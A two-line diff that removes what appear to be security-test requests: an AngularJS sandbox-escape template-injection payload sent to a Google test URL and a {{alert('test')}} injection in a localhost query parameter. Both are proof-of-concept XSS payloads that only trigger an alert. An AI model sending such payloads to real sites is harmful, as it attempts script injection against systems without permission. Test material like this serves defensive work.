@@ -1,2 +1,0 @@
-POST(string={{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}): https://www.google.com/test/
-GET(category={{alert('test')}}): http://localhost:5000/home?category={{alert('test')}}
